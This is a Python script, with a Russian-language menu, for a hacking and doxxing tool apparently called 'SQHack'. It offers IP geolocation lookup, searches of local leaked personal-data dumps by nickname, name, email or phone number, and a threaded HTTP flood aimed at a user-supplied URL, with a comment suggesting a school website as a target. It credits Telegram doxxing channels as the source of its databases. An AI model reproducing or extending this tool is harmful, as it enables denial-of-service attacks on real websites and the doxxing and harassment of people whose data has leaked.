from colorama import init, Fore
import requests
import threading
import os
import sys

init(autoreset=True)

def search_in_file(file_contents, search_query):
    lines = file_contents.split('\n')
    matching_lines = [line for line in lines if search_query in line]
    return matching_lines

def make_request(url):
    response = requests.get(url)
    print(response.status_code)

print(Fore.RED + "  _____   ____   _    _               _")
print(Fore.RED + " / ____| / __ \ | |  | |             | |")
print(Fore.RED + "| (___  | |  | || |__| |  __ _   ___ | | __")
print(Fore.RED + " \___ \ | |  | ||  __  | / _` | / __|| |/ /")
print(Fore.RED + " ____) || |__| || |  | || (_| || (__ |   <")
print(Fore.RED + "|_____/  \___\_\|_|  |_| \__,_| \___||_|\_|        by Orbit337")
print("")
print(Fore.BLUE + "Выберите функцию")
print(Fore.BLUE + "[1] Пробив по Айпи")
print(Fore.BLUE + "[2] Поиск по нику в Telegram")
print(Fore.BLUE + "[3] DDoS Атака")
print(Fore.BLUE + "[4] Продвинутый Поиск")
print(Fore.BLUE + "[5] Об Авторе")
user_input = input(Fore.BLUE + "Введите число: ")

if user_input == "1":
    print(Fore.BLUE + "Обычный пробив по IP")
    def get_ip_info(ip_address):
        try:
            url = f"https://ipinfo.io/{ip_address}/json"
            response = requests.get(url)
            response.raise_for_status()
            data = response.json()
            return data
        except requests.exceptions.RequestException as e:
            print(f"Произошла ошибка при отправке запроса: {e}")
            return None

    ip_address = input(Fore.BLUE + "Введите IP: ")
    ip_info = get_ip_info(ip_address)

    if ip_info:
        formatted_info = f"""
        {Fore.RED}IP-адрес: {ip_info.get('ip', 'Не удалось получить')}
        Хостнейм: {ip_info.get('hostname', 'Не удалось получить')}
        Город: {ip_info.get('city', 'Не удалось получить')}
        Регион: {ip_info.get('region', 'Не удалось получить')}
        Страна: {ip_info.get('country', 'Не удалось получить')}
        Почтовый индекс: {ip_info.get('postal', 'Не удалось получить')}
        Часовой пояс: {ip_info.get('timezone', 'Не удалось получить')}
        Организация: {ip_info.get('org', 'Не удалось получить')}
        Anycast: {'Да' if ip_info.get('anycast', False) else 'Нет'}
        Местоположение: {ip_info.get('loc', 'Не удалось получить')}
        {Fore.RESET}
        """
        print(formatted_info)
        input()
elif user_input == "2":
    print(Fore.BLUE + "Поиск осуществляется в базе данных Eye of God")
    print(Fore.BLUE + "Не пишите всякую фигню если вы хотите чтобы нормально нашло")
    file_path = r'C:\Users\NIK\Desktop\SqHack\sqhack\Base\God_eye_basedata.txt'
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            file_contents = file.read()
            search_query = input(Fore.BLUE + "Введите Ник: ")
            matching_lines = search_in_file(file_contents, search_query)

            if matching_lines:
                print(Fore.RED + "Найдены совпадения:")
                for line in matching_lines:
                    print(Fore.RED + line)
                input()
                exit()
            else:
                print(Fore.RED + "Совпадений не найдено.")
                input()
    except FileNotFoundError:
        print(f"Файл {file_path} не найден.")
    except Exception as e:
        print(f"Произошла ошибка: {str(e)}")
elif user_input == "3":
    print("если в вашей консоли будет спамить всякими ошибками то не парьтесь все работает ;)")
    print(Fore.BLUE + "не пытайтесь заддосить какой нибудь ютуб лагать будет только у вас максимум что можно задудосить это сайт школы :)")
    url = input(Fore.BLUE + "Введите URL: ")

    while True:
        print(Fore.RED + "Отправленно Запросов: 200")
        t = threading.Thread(target=make_request, args=(url,))
        t.start()
elif user_input == "4":
    print(Fore.BLUE + "Не пишите всякую фигню если вы хотите чтобы нормально нашло")
    file_path = r'C:\Users\NIK\Desktop\SqHack\sqhack\Base\prodpoisk.txt'
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            file_contents = file.read()
            search_query = input(Fore.BLUE + "Введите Имя/Отчество/Фамилия/Почта/Номер: ")
            matching_lines = search_in_file(file_contents, search_query)

            if matching_lines:
                print(Fore.RED + "Найдены совпадения:")
                for line in matching_lines:
                    print(Fore.RED + line)
                input()
                exit()
    except FileNotFoundError:
        print(f"Файл {file_path} не найден.")
    except Exception as e:
        print(f"Произошла ошибка: {str(e)}")
elif user_input == "5":
        print(Fore.RED + "SQHack")
        print(Fore.RED + "Автор: Orbit337")
        print(Fore.RED + "Бот: https://t.me/SQHackbot_bot")
        print(Fore.RED + "Базы взяты из: https://t.me/+fZOkjTMx0r1hMjk6")
        print(Fore.RED + "Базы взяты из: https://t.me/DoxxingPrivateChannel")
        print(Fore.RED + "Спасибо им большое! <3")
else:
    print(Fore.RED + "Некорректный ввод. Введите 1, 2, 3, 4, 5.")
    input()    